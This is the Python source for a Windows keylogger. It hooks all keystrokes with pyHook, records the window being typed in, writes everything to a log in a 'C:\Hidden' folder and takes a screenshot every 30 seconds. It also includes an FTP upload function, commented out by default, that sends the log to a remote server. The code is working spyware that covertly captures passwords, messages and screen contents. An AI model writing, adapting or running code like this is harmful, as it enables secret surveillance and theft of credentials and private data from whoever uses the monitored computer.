import pyHook, pythoncom, os, getpass, time
from PIL import ImageGrab
from ftplib import FTP  # for uploading the file to an FTP server
from datetime import datetime

"""Setting Variables"""
currentuser = getpass.getuser()  # Get the username of the currently logged in user
currentline = ""  # This is used to store a buffer of keypresses
windowname = ""  # Used to store the name of the window being typed in
todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'C:\\Hidden\\' + currentuser + '_' + todays_date + '.txt'
starttime = time.time()

"""Creating Filepaths"""
logpath = r'C:\Hidden'
if not os.path.exists(logpath):
    os.makedirs(logpath)
screenshotpath = (r'C:\Hidden\Screenshots\\' + currentuser)
if not os.path.exists(screenshotpath):
    os.makedirs(screenshotpath)


def TakeScreenshot():
    global currentuser
    image = ImageGrab.grab()  # Copy the currently viewed screen into the image variable
    image.save('C:\\Hidden\Screenshots\\' + currentuser + '\\' + datetime.now().strftime('%Y%m%d_%H%M%S') + '.png' )


def uploadftp():
    ftpserver = FTP('FTP Server address')  # Add an FTP server address here
    ftpserver.login('FTP Username', 'FTP password') # Add the logon details for the FTP server here
    ftpserver.storbinary("STOR "+ currentuser + '_' + todays_date + ".txt", open(file_name, 'r'))
    ftpserver.close()
    return


def saveline(line):
    newfile = open(file_name, 'a+')
    newfile.write(line)
    newfile.close()
    # uploadftp()
    """ Uncomment to include the FTP upload function.  Adding it here would replace the file on the FTP server
    everytime a new line is created. This could be called elsewhere in the code to lower the frequency and reduce
    network traffic"""


def OnKeyboardEvent(event):
    global currentline, windowname, starttime

    if time.time() - starttime > 30:  # Takes a screenshot every 30 seconds
        TakeScreenshot()
        starttime = time.time()  # Reset the counter to 0

    if windowname != event.WindowName:  # Check if typing in a new window
        if currentline != "":  # Check to make sure nothing is in the buffer waiting to be added to the log
            currentline += '\n'  # Add a new line if characters are waiting in the buffer
            saveline(currentline)  # Add files in the buffer from a previous window to the log

        currentline = ""  # clear the line buffer now that any previous lines have been saved
        saveline('\n-----WindowName: ' + event.WindowName + '-----\n')  # add the new window name to the file
        windowname = event.WindowName  # set the current window name to be checked next time

    if event.Ascii == 13 or event.Ascii == 9:  # Check if Enter or Tab is pressed
        currentline += '\n'  # Add new line to the buffer if it is
        saveline(currentline)  # Save the buffer to the log
        currentline = ""  # clear the line buffer
        return True  # exit

    if event.Ascii == 8:  # Check if backspace is pressed
        currentline = currentline[:-1]  # Delete the last typed character
        return True  # exit

    if event.Ascii < 32 or event.Ascii > 126:  # Check if a non ASCII character is pressed
        if event.Ascii == 0:  # unknown character (arrow key, shift, ctrl, alt)
            pass  # do nothing
        else:
            currentline = currentline + '\n' + str(event.Ascii) + '\n'
    else:
        currentline += chr(event.Ascii)  # add typed character to the buffer

    return True  # pass event to other handlers


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

"""                     ---What's happening above?---
    When a key is pressed, the logger first checks the window name that the key was pressed in, if this hasn't already
    been recorded in the log it will be added.    
    Next it will check if it was 'enter' or 'tab' that was pressed. If so, a new line will be added to the log.
    Next it will check if backspace has been pressed. If so, the last character in the buffer will be deleted.
    Next it will discard any non-ASCII characters
    Finally the character will be added to the log if it meets none of the conditions above. 
"""